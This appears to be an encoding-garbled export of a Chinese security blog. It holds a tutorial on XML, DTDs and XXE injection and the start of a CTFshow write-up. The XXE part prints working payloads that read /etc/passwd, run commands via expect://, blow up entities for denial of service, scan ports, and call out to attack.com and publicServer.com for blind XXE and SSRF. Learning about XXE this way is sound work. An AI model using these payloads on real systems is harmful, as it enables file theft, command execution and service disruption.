&lt;bookstore&gt;                                                 &lt;!--æ ¹å…ƒç´ --&gt;
&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstoreçš„å­å…ƒç´ ï¼Œcategoryä¸ºå±æ€§--&gt;
&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--bookçš„å­å…ƒç´ ï¼Œlangä¸ºå±æ€§--&gt;
&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--bookçš„å­å…ƒç´ --&gt;
&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--bookçš„å­å…ƒç´ --&gt;
&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--bookçš„å­å…ƒç´ --&gt;
&lt;/book&gt;                                                 &lt;!--bookçš„ç»“æŸ--&gt;
&lt;/bookstore&gt;                                       &lt;!--bookstoreçš„ç»“æŸ--&gt;</code></pre>

<p>å…¶ä¸­<code>&lt;note&gt;</code>æ˜¯æ ¹å…ƒç´ ï¼Œæ¯ä¸ªXMLæ–‡æ¡£å¿…é¡»åŒ…å«ä¸€ä¸ªæ ¹å…ƒç´ ã€‚</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> ç§°ä¸º XML prolog ï¼Œç”¨äºå£°æ˜XMLæ–‡æ¡£çš„ç‰ˆæœ¬å’Œç¼–ç ï¼Œæ˜¯å¯é€‰çš„ï¼Œå¿…é¡»æ”¾åœ¨æ–‡æ¡£å¼€å¤´ã€‚</p>
<p>standaloneå€¼æ˜¯yesçš„æ—¶å€™è¡¨ç¤ºDTDä»…ç”¨äºéªŒè¯æ–‡æ¡£ç»“æ„ï¼Œä»è€Œå¤–éƒ¨å®ä½“å°†è¢«ç¦ç”¨ï¼Œä½†å®ƒçš„é»˜è®¤å€¼æ˜¯noï¼Œè€Œä¸”æœ‰äº›parserä¼šç›´æ¥å¿½ç•¥è¿™ä¸€é¡¹ã€‚</p>
<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p><strong>DTDåŸºæœ¬æ¦‚å¿µ</strong><br>XML æ–‡æ¡£æœ‰è‡ªå·±çš„ä¸€ä¸ªæ ¼å¼è§„èŒƒï¼Œè¿™ä¸ªæ ¼å¼è§„èŒƒæ˜¯ç”±ä¸€ä¸ªå«åš DTDï¼ˆdocument type definitionï¼‰ çš„ä¸œè¥¿æ§åˆ¶çš„ã€‚<br>DTDç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨å¦å¤–ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ã€‚æ˜¯XMLæ–‡æ¡£ä¸­çš„å‡ æ¡è¯­å¥ï¼Œç”¨æ¥è¯´æ˜å“ªäº›å…ƒç´ &#x2F;å±æ€§æ˜¯åˆæ³•çš„ä»¥åŠå…ƒç´ é—´åº”å½“æ€æ ·åµŒå¥—&#x2F;ç»“åˆï¼Œä¹Ÿç”¨æ¥å°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦å’Œå¯å¤ç”¨ä»£ç æ®µè‡ªå®šä¹‰ä¸ºå®ä½“ã€‚<br><strong>å®ä½“å¼•ç”¨</strong><br>XMLå…ƒç´ ä»¥å½¢å¦‚ <code>&lt;tag&gt;foo&lt;/tag&gt;</code> çš„æ ‡ç­¾å¼€å§‹å’Œç»“æŸï¼Œå¦‚æœå…ƒç´ å†…éƒ¨å‡ºç°å¦‚<code>&lt;</code> çš„ç‰¹æ®Šå­—ç¬¦ï¼Œè§£æå°±ä¼šå¤±è´¥ï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼ŒXMLç”¨å®ä½“å¼•ç”¨ï¼ˆentity referenceï¼‰æ›¿æ¢ç‰¹æ®Šå­—ç¬¦ã€‚XMLé¢„å®šä¹‰äº”ä¸ªå®ä½“å¼•ç”¨ï¼Œå³ç”¨<code>&lt; &gt; &amp; &#39; &quot;</code> æ›¿æ¢ <code>&lt; &gt; &amp; &#39; &quot;</code> ã€‚<br>å®ä½“å¼•ç”¨å¯ä»¥èµ·åˆ°ç±»ä¼¼å®å®šä¹‰å’Œæ–‡ä»¶åŒ…å«çš„æ•ˆæœï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›è‡ªå®šä¹‰å®ä½“å¼•ç”¨ï¼Œè¿™ä¸ªæ“ä½œåœ¨ç§°ä¸º Document Type Definationï¼ˆDTDï¼Œæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„è¿‡ç¨‹ä¸­è¿›è¡Œã€‚<br><strong>dtdçš„å¼•å…¥æ–¹å¼</strong><br>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚<br><em>å†…éƒ¨ DTD</em><br>ä½¿ç”¨å†…éƒ¨çš„dtdæ–‡ä»¶ï¼Œå³å°†çº¦æŸè§„åˆ™å®šä¹‰åœ¨xmlæ–‡æ¡£ä¸­</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE æ ¹å…ƒç´ åç§° [å…ƒç´ å£°æ˜]&gt;</code></pre>

<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note [&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;
&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
]&gt;
&lt;note&gt;
&lt;to&gt;Y0u&lt;/to&gt;
&lt;from&gt;@re&lt;/from&gt;
&lt;head&gt;v3ry&lt;/head&gt;
&lt;body&gt;g00d!&lt;/body&gt;
&lt;/note&gt;</code></pre>

<p><em>å¤–éƒ¨ DTD</em><br>ï¼ˆ1ï¼‰å¼•å…¥å¤–éƒ¨çš„dtdæ–‡ä»¶</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE æ ¹å…ƒç´ åç§° SYSTEM &quot;dtdè·¯å¾„&quot;&gt;</code></pre>

<p>ï¼ˆ2ï¼‰ä½¿ç”¨å¤–éƒ¨çš„dtdæ–‡ä»¶(ç½‘ç»œä¸Šçš„dtdæ–‡ä»¶)</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;DTDåç§°&quot; &quot;DTDæ–‡æ¡£çš„URL&quot;&gt;</code></pre>

<p>å½“ä½¿ç”¨å¤–éƒ¨DTDæ—¶ï¼Œé€šè¿‡å¦‚ä¸‹è¯­æ³•å¼•å…¥ï¼š</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></pre>

<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;
&lt;note&gt;
&lt;to&gt;Y0u&lt;/to&gt;
&lt;from&gt;@re&lt;/from&gt;
&lt;head&gt;v3ry&lt;/head&gt;
&lt;body&gt;g00d!&lt;/body&gt;
&lt;/note&gt;</code></pre>

<p>test.dtd</p>
<pre><code class="highlight plaintext">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</code></pre>

<p><strong>PCDATA</strong><br>PCDATAçš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ã€‚PCDATAæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚<br>è¢«è§£æçš„å­—ç¬¦æ•°æ®ä¸åº”å½“åŒ…å«ä»»ä½•<code>&amp;</code>ï¼Œ<code>&lt;</code>ï¼Œæˆ–è€…<code>&gt;</code>å­—ç¬¦ï¼Œéœ€è¦ç”¨<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>å®ä½“æ¥åˆ†åˆ«æ›¿æ¢ã€‚<br><strong>CDATA</strong><br>CDATAæ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ŒCDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ï¼Œåœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€ã€‚<br><strong>DTDå…ƒç´ </strong><br><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150727-65e7882a-14d2-1.png" alt="img"><br><strong>DTDå±æ€§</strong><br><strong>å±æ€§å£°æ˜è¯­æ³•</strong>ï¼š</p>
<pre><code class="highlight plaintext">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ é»˜è®¤å€¼&gt;</code></pre>

<p>DTDå®ä¾‹ï¼š</p>
<pre><code class="highlight plaintext">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</code></pre>

<p>XMLå®ä¾‹ï¼š</p>
<pre><code class="highlight plaintext">&lt;payment Luckey=&quot;Q&quot; /&gt;</code></pre>

<p>ä»¥ä¸‹æ˜¯ å±æ€§ç±»å‹çš„é€‰é¡¹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150821-85ef2e3e-14d2-1.png" alt="20191202150821-85ef2e3e-14d2-1"></p>
<p>é»˜è®¤å±æ€§å€¼å¯ä½¿ç”¨ä¸‹åˆ—å€¼ï¼š</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150849-96eb9a7e-14d2-1.png" alt="20191202150849-96eb9a7e-14d2-1"></p>
<p><strong>DTDå®ä½“</strong></p>
<blockquote>
<p>å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚<br>å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚<br>å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</p>
</blockquote>
<p><em>æŒ‰å®ä½“æœ‰æ— å‚åˆ†ç±»ï¼Œå®ä½“åˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“</em><br><em>ä¸€èˆ¬å®ä½“çš„å£°æ˜</em>ï¼š<code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;</code><br>å¼•ç”¨ä¸€èˆ¬å®ä½“çš„æ–¹æ³•ï¼š<code>&amp;å®ä½“åç§°;</code><br>psï¼šç»å®éªŒï¼Œæ™®é€šå®ä½“å¯ä»¥åœ¨DTDä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨XMLä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨å£°æ˜å‰å¼•ç”¨ï¼Œè¿˜å¯ä»¥åœ¨å®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚</p>
<p><em>å‚æ•°å®ä½“çš„å£°æ˜</em>ï¼š<code>&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;</code><br>å¼•ç”¨å‚æ•°å®ä½“çš„æ–¹æ³•ï¼š<code>%å®ä½“åç§°;</code><br>psï¼šç»å®éªŒï¼Œå‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­å¼•ç”¨ï¼Œä¸èƒ½åœ¨å£°æ˜å‰å¼•ç”¨ï¼Œä¹Ÿä¸èƒ½åœ¨å®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚<br>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p>
<p><em>æŒ‰å®ä½“ä½¿ç”¨æ–¹å¼åˆ†ç±»ï¼Œå®ä½“åˆ†ä¸ºå†…éƒ¨å£°æ˜å®ä½“å’Œå¼•ç”¨å¤–éƒ¨å®ä½“</em><br><em>å†…éƒ¨å®ä½“</em></p>
<pre><code class="highlight plaintext">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code></pre>

<p>å†…éƒ¨å®ä½“ç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY writer &quot;Dawn&quot;&gt;
    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
]&gt;
&lt;test&gt;&amp;writer;Â©right;&lt;/test&gt;</code></pre>

<p><em>å¤–éƒ¨å®ä½“</em><br>å¤–éƒ¨å®ä½“ï¼Œç”¨æ¥å¼•å…¥å¤–éƒ¨èµ„æºã€‚æœ‰<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœºã€‚</p>
<pre><code class="highlight plaintext">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;
æˆ–è€…
&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre>

<p>å¤–éƒ¨å®ä½“ç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
]&gt;
&lt;author&gt;&amp;file;Â©right;&lt;/author&gt;</code></pre>

<p>å¤–éƒ¨å®ä½“å¯æ”¯æŒhttpã€fileç­‰åè®®ã€‚ä¸åŒç¨‹åºæ”¯æŒçš„åè®®ä¸åŒï¼š<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202150935-b26e4a30-14d2-1.png" alt="img"><br>PHPæ”¯æŒçš„åè®®ä¼šæ›´å¤šä¸€äº›ï¼Œä½†éœ€è¦ä¸€å®šçš„æ‰©å±•ï¼š<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202151023-cf02c3ba-14d2-1.png" alt="img"><br>PHPå¼•ç”¨å¤–éƒ¨å®ä½“ï¼Œ<strong>å¸¸è§çš„åˆ©ç”¨åè®®</strong>ï¼š</p>
<pre><code class="highlight plaintext">file://æ–‡ä»¶ç»å¯¹è·¯å¾„ å¦‚ï¼šfile:///etc/passwd
http://url/file.txt
php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>

<p><em>å‚æ•°å®ä½“+å¤–éƒ¨å®ä½“</em></p>
<pre><code class="highlight plaintext">&lt;!ENTITY % å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;</code></pre>

<p>å‚æ•°å®ä½“+å¤–éƒ¨å®ä½“ç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
  %file;
]&gt;</code></pre>

<p><code>%file</code>(å‚æ•°å®ä½“)æ˜¯åœ¨DTDä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ<code>&amp;file;</code>æ˜¯åœ¨xmlæ–‡æ¡£ä¸­è¢«å¼•ç”¨çš„ã€‚</p>
<h2 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)"></a>XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)</h2><h3 id="XXEæ¼æ´ç®€ä»‹"><a href="#XXEæ¼æ´ç®€ä»‹" class="headerlink" title="XXEæ¼æ´ç®€ä»‹"></a>XXEæ¼æ´ç®€ä»‹</h3><p>XXEæ¼æ´å…¨ç§°XML External Entity Injection å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚<br>XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆ<strong>ä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»</strong>ç­‰å±å®³ã€‚<br>XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p>
<p>è§£æxmlåœ¨phpåº“libxmlï¼Œlibxml&gt;&#x3D;2.9.0çš„ç‰ˆæœ¬ä¸­æ²¡æœ‰XXEæ¼æ´</p>
<h3 id="XXEå¸¸è§åˆ©ç”¨æ–¹å¼"><a href="#XXEå¸¸è§åˆ©ç”¨æ–¹å¼" class="headerlink" title="XXEå¸¸è§åˆ©ç”¨æ–¹å¼"></a>XXEå¸¸è§åˆ©ç”¨æ–¹å¼</h3><p>ä¸SQLç›¸ä¼¼ï¼ŒXXEæ¼æ´ä¹Ÿåˆ†ä¸ºæœ‰å›æ˜¾å’Œæ— å›æ˜¾<br>æœ‰å›æ˜¾ï¼Œå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡ã€‚<br>æ— å›æ˜¾ï¼Œåˆç§°ä¸ºblind xxeï¼Œå¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®(OOB)é€šé“æå–æ•°æ®ã€‚å³å¯ä»¥å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„XMLæ–‡ä»¶è¯»å–æ–‡ä»¶ã€‚</p>
<h4 id="è¯»å–ä»»æ„æ–‡ä»¶"><a href="#è¯»å–ä»»æ„æ–‡ä»¶" class="headerlink" title="è¯»å–ä»»æ„æ–‡ä»¶"></a>è¯»å–ä»»æ„æ–‡ä»¶</h4><p>é¦–å…ˆå‡†å¤‡ä¸€ä¸ªæœ‰XXEæ¼æ´çš„æ–‡ä»¶ï¼Œè¿™é‡Œä»¥phpæ–‡ä»¶ä¸ºä¾‹<br>ç¤ºä¾‹ä»£ç </p>
<pre><code class="highlight plaintext">&lt;?php
$xml = simplexml_load_string($_REQUEST[&#x27;xml&#x27;]);
print_r($xml);//æ³¨é‡Šæ‰è¯¥è¯­å¥å³ä¸ºæ— å›æ˜¾çš„æƒ…å†µ
?&gt;</code></pre>

<p>æ„é€ payload</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt;
]&gt;
&lt;root&gt;
&lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/root&gt;
æˆ–è€…
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ELEMENT data (#ANY)&gt;
&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre>

<p>å¦‚æœæ­é…vpså¼¹shellçš„è¯éœ€è¦åœ¨è‡ªå·±çš„VPSä¸Šå†™ä¸€ä¸ªdtd</p>
<pre><code class="highlight plaintext"></code></pre>



<h4 id="æ‹’ç»æœåŠ¡æ”»å‡»"><a href="#æ‹’ç»æœåŠ¡æ”»å‡»" class="headerlink" title="æ‹’ç»æœåŠ¡æ”»å‡»"></a>æ‹’ç»æœåŠ¡æ”»å‡»</h4><pre><code class="highlight plaintext">&lt;!DOCTYPE data [
&lt;!ELEMENT data (#ANY)&gt;
&lt;!ENTITY a0 &quot;dos&quot; &gt;
&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
]&gt;
&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre>

<p>è‹¥è§£æè¿‡ç¨‹éå¸¸ç¼“æ…¢ï¼Œåˆ™è¡¨ç¤ºæµ‹è¯•æˆåŠŸï¼Œç›®æ ‡ç«™ç‚¹å¯èƒ½æœ‰æ‹’ç»æœåŠ¡æ¼æ´ã€‚ å…·ä½“æ”»å‡»å¯ä½¿ç”¨æ›´å¤šå±‚çš„è¿­ä»£æˆ–é€’å½’ï¼Œä¹Ÿå¯å¼•ç”¨å·¨å¤§çš„å¤–éƒ¨å®ä½“ï¼Œä»¥å®ç°æ”»å‡»çš„æ•ˆæœã€‚</p>
<p>å¤§æ¦‚çš„é€»è¾‘å°±æ˜¯é€šè¿‡åµŒå¥—å ç”¨æœåŠ¡å™¨çš„èµ„æºï¼Œæ¥é€ æˆæœåŠ¡å™¨çš„æœåŠ¡å´©æºƒ</p>
<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
		&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
]&gt;
&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre>

<h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080â€œ&gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>

<h4 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://attack.com/1.dtoâ€œ&gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>

<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
&lt;!ELEMENT data (#ANY)&gt;
]&gt;
&lt;data&gt;4&lt;/data&gt;</code></pre>

<h4 id="X-Include"><a href="#X-Include" class="headerlink" title="X-Include"></a>X-Include</h4><pre><code class="highlight plaintext">&lt;?xml version=&#x27;1.0&#x27;?&gt;
&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>



]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ·é¢˜è›†æ¥å’¯-CTFshow</title>
    <url>/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/</url>
    <content><![CDATA[<h1 id="å‰é¢å¿˜äº†ï¼Œåé¢å¿˜äº†ï¼Œè®°å½•ä¸‹å°±å¯¹äº†"><a href="#å‰é¢å¿˜äº†ï¼Œåé¢å¿˜äº†ï¼Œè®°å½•ä¸‹å°±å¯¹äº†" class="headerlink" title="å‰é¢å¿˜äº†ï¼Œåé¢å¿˜äº†ï¼Œè®°å½•ä¸‹å°±å¯¹äº†"></a>å‰é¢å¿˜äº†ï¼Œåé¢å¿˜äº†ï¼Œè®°å½•ä¸‹å°±å¯¹äº†</h1><h2 id="ä¿¡æ¯æ”¶é›†-Complete"><a href="#ä¿¡æ¯æ”¶é›†-Complete" class="headerlink" title="ä¿¡æ¯æ”¶é›†(Complete)"></a>ä¿¡æ¯æ”¶é›†(Complete)</h2><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><p>å…¥é—¨ï¼Œçœ‹æºç ï¼Œ<code>view-source</code>&#x2F;F12</p>
<h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p>å†™çš„æ— æ³•æŸ¥çœ‹å°±æ— æ³•æŸ¥çœ‹äº†å—?</p>
<p>éä¹Ÿéä¹Ÿ</p>
<p><code>view-source</code></p>
<p>å…¶å®å¯ä»¥é¡ºå¸¦è§‚å¯Ÿä¸€ä¸‹æºç çš„JS</p>
<pre><code class="highlight plaintext">&lt;script type=&quot;text/javascript&quot;&gt;
	window.oncontextmenu = function()&#123;return false&#125;;
	window.onselectstart = function()&#123;return false&#125;;
	window.onkeydown = function()&#123;if (event.keyCode==123)&#123;event.keyCode=0;event.returnValue=false;&#125;&#125;;
&lt;/script&gt;</code></pre>

<p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªæ§åˆ¶äº†å³å‡»é¼ æ ‡äº‹ä»¶ï¼Œç¬¬äºŒä¸ªæ§åˆ¶äº†é€‰æ‹©äº‹ä»¶ï¼Œç¬¬ä¸‰ç»™æ§åˆ¶äº†é”®ç›˜è¾“å…¥</p>
<p>å¹¶ä¸”è¿”å›ç»“æœéƒ½æ˜¯falseï¼Œè¿™æ ·ä½ å½“ç„¶å°±æ— æ³•è¿›è¡Œä»»ä½•æ“ä½œäº†å•¦å•¦å•¦</p>
<pre><code class="highlight plaintext">ç¦æ­¢é¼ æ ‡å³é”®ï¼šoncontextmenu=function()&#123;return false&#125;;
ç¦æ­¢é€‰æ‹©ï¼šonselectstart=function()&#123;return false&#125;;
ç¦æ­¢æ‹–æ”¾ï¼šondragstart=function()&#123;return false&#125;;
ç¦æ­¢æ‹·è´ï¼šoncopy=document.selection.empty() ã€‚
ç¦æ­¢å¤åˆ¶ï¼šoncopy = function()&#123;return false&#125;;
